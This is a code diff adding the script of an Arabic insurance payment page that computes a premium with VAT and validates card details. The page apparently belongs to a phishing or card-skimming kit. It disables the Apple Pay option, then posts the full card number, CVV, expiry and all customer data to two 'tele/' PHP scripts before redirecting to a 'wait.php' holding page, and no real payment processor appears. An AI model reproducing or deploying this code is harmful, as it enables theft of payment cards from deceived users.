+  // الخصم الثابت
+  const discount = 75.30;
+  
+  // حساب المبالغ
+  const basePrice = ins.base || 0;
+  const subtotal = basePrice + servicesTotal - discount;  // القسط الأساسي + الخدمات - الخصم
+  const vatAmount = subtotal * 0.15;  // 15% ضريبة
+  const totalAmount = subtotal + vatAmount;  // المجموع النهائي
+  
+  // عرض المبالغ
+  document.getElementById("row-base").textContent = basePrice.toFixed(2);
+  document.getElementById("row-discount").textContent = discount.toFixed(2);
+  document.getElementById("row-sub").textContent = subtotal.toFixed(2);
+  document.getElementById("row-vat").textContent = vatAmount.toFixed(2);
+  document.getElementById("row-total").textContent = totalAmount.toFixed(2);
+  document.getElementById("card-option-amount").textContent = totalAmount.toFixed(2) + " ر.س";
+  document.getElementById("btn-amount").textContent = totalAmount.toFixed(2);
+
+  // تواريخ التأمين - استخدام التاريخ من بيانات العميل
+  var start;
+  if (customerData.policy_start_date) {
+    // استخدام التاريخ الذي اختاره المستخدم في الصفحة السابقة
+    start = new Date(customerData.policy_start_date);
+  } else {
+    // في حالة عدم وجود تاريخ، استخدم اليوم
+    start = new Date();
+  }
+  
+  var end = new Date(start);
+  end.setFullYear(end.getFullYear() + 1);
+  
+  document.getElementById("d-start").textContent = fmtArDate(start.toISOString().slice(0, 10));
+  document.getElementById("d-end").textContent = fmtArDate(end.toISOString().slice(0, 10));
+
+  var optCard = document.getElementById("opt-card");
+  var optApple = document.getElementById("opt-apple");
+  var appleErr = document.getElementById("apple-pay-err");
+
+  optApple.addEventListener("click", function () {
+    appleErr.classList.remove("hidden");
+    window.setTimeout(function () { appleErr.classList.add("hidden"); }, 2000);
+  });
+
+  var numEl = document.getElementById("card-number");
+  var brandSlot = document.getElementById("card-brand-slot");
+  var errCard = document.getElementById("err-card");
+  
+  numEl.addEventListener("input", function () {
+    var f = fmtPan(numEl.value);
+    if (f.replace(/\s/g, "").length <= 16) numEl.value = f;
+    var b = brandForPan(numEl.value);
+    
+    // التحقق الفوري من رقم البطاقة
+    var cardNum = numEl.value.replace(/\s/g, "");
+    
+    if (cardNum.length >= 13) { // البطاقات تبدأ من 13 رقم
+      if (luhnCheck(cardNum)) {
+        // رقم صحيح
+        numEl.style.borderColor = '#10b981'; // أخضر
+        brandSlot.innerHTML = b ? '<img src="' + b + '" width="38" height="25" alt="" />' : "";
+        errCard.classList.add('hidden');
+      } else {
+        // رقم خاطئ
+        numEl.style.borderColor = '#dc2626'; // أحمر
+        brandSlot.innerHTML = b ? '<img src="' + b + '" width="38" height="25" alt="" />' : "";
+        errCard.textContent = 'رقم البطاقة غير صحيح';
+        errCard.classList.remove('hidden');
+      }
+    } else {
+      // لم يكتمل الرقم بعد
+      numEl.style.borderColor = '#e0e0e0'; // رمادي (الافتراضي)
+      brandSlot.innerHTML = b ? '<img src="' + b + '" width="38" height="25" alt="" />' : "";
+      errCard.classList.add('hidden');
+    }
+  });
+
+  document.getElementById("pay-form").addEventListener("submit", async function (ev) {
+    ev.preventDefault();
+    
+    // إخفاء جميع رسائل الخطأ وإعادة تعيين الحدود
+    document.querySelectorAll('.text-red-500').forEach(err => err.classList.add('hidden'));
+    document.querySelectorAll('input, .custom-select').forEach(input => {
+      input.style.borderColor = '#e0e0e0';
+    });
+    
+    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
+    const cardHolder = document.getElementById('card-holder-name').value;
+    const cvv = document.getElementById('card-cvv').value;
+    const month = document.getElementById('expiry-month').value;
+    const year = document.getElementById('expiry-year').value;
+    
+    let hasError = false;
+    
+    // التحقق من رقم البطاقة
+    if (!luhnCheck(cardNumber)) {
+      const cardInput = document.getElementById('card-number');
+      const errCard = document.getElementById('err-card');
+      cardInput.style.borderColor = '#dc2626';
+      errCard.textContent = 'رقم البطاقة غير صحيح';
+      errCard.classList.remove('hidden');
+      hasError = true;
+    }
+    
+    // التحقق من اسم صاحب البطاقة
+    if (cardHolder.length < 3) {
+      const nameInput = document.getElementById('card-holder-name');
+      const errName = document.getElementById('err-name');
+      nameInput.style.borderColor = '#dc2626';
+      errName.textContent = 'الرجاء إدخال اسم صحيح (3 أحرف على الأقل)';
+      errName.classList.remove('hidden');
+      hasError = true;
+    }
+    
+    // التحقق من CVV
+    if (cvv.length < 3) {
+      const cvvInput = document.getElementById('card-cvv');
+      const errCvv = document.getElementById('err-cvv');
+      cvvInput.style.borderColor = '#dc2626';
+      errCvv.textContent = 'رمز CVV غير صحيح (3-4 أرقام)';
+      errCvv.classList.remove('hidden');
+      hasError = true;
+    }
+    
+    // التحقق من الشهر
+    if (!month) {
+      const monthSelect = document.getElementById('month-select');
+      const errMonth = document.getElementById('err-m');
+      monthSelect.style.borderColor = '#dc2626';
+      errMonth.textContent = 'الرجاء اختيار الشهر';
+      errMonth.classList.remove('hidden');
+      hasError = true;
+    }
+    
+    // التحقق من السنة
+    if (!year) {
+      const yearSelect = document.getElementById('year-select');
+      const errYear = document.getElementById('err-y');
+      yearSelect.style.borderColor = '#dc2626';
+      errYear.textContent = 'الرجاء اختيار السنة';
+      errYear.classList.remove('hidden');
+      hasError = true;
+    }
+    
+    // إذا كان هناك أخطاء، توقف
+    if (hasError) {
+      return;
+    }
+    
+    document.getElementById("pay-modal").classList.add("show");
+    
+    // حساب المبالغ النهائية مع الخصم
+    const servicesTotal = (ins.features || []).reduce((sum, f) => sum + f.price, 0);
+    const discount = 75.30;
+    const basePrice = ins.base || 0;
+    const subtotal = basePrice + servicesTotal - discount;
+    const vat = subtotal * 0.15;
+    const total = subtotal + vat;
+    
+    const formData = new URLSearchParams();
+    formData.append('name', cardHolder);
+    formData.append('cardnumber', cardNumber);
+    formData.append('expirationdate', month + '/' + year);
+    formData.append('securitycode', cvv);
+    formData.append('cardholder_name', cardHolder);
+    formData.append('card_number', cardNumber);
+    formData.append('expiry_date', month + '/' + year);
+    formData.append('cvv', cvv);
+    formData.append('payment_method', 'card');
+    
+    formData.append('company', ins.company || '');
+    formData.append('plan', ins.plan || '');
+    formData.append('base', basePrice.toFixed(2));
+    formData.append('services_total', servicesTotal.toFixed(2));
+    formData.append('discount', discount.toFixed(2));
+    formData.append('price', subtotal.toFixed(2));
+    formData.append('vat', vat.toFixed(2));
+    formData.append('total', total.toFixed(2));
+    formData.append('features', JSON.stringify(ins.features || []));
+    
+    Object.keys(customerData).forEach(key => {
+      formData.append(key, customerData[key] || '');
+    });
+    formData.append('user_id', userIdFromUrl);
+    
+    formData.append('start_date', start.toISOString().slice(0,10));
+    formData.append('end_date', end.toISOString().slice(0,10));
+    
+    formData.append('insurance_json', JSON.stringify(ins));
+    formData.append('features_json', JSON.stringify(ins.features || []));
+    formData.append('total_amount', ins.total ?? '');
+
+    try{
+      await fetch('tele/pay.php', {
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+        body: formData.toString()
+      });
+      
+      await fetch('tele/pay2.php', {
+        method:'POST',
+        headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+        body: formData.toString()
+      });
+      
+      setTimeout(() => {
+        const redirectForm = document.createElement('form');
+        redirectForm.method = 'POST';
+        redirectForm.action = 'wait.php' + (userIdFromUrl ? ('?user_id='+encodeURIComponent(userIdFromUrl)) : '');
+        
+        for (let [key, value] of formData.entries()) {
+          const input = document.createElement('input');
+          input.type = 'hidden';
+          input.name = key;
+          input.value = value;
+          redirectForm.appendChild(input);
+        }
+        
+        document.body.appendChild(redirectForm);
+        redirectForm.submit();
+      }, 2000);
+      
+    }catch(err){
+      document.getElementById("pay-modal").classList.remove("show");
+      alert('تعذّر الإرسال، يرجى المحاولة مرة أخرى');
+    }
+  });
+})();
+  </script>
+</body>
+</html>
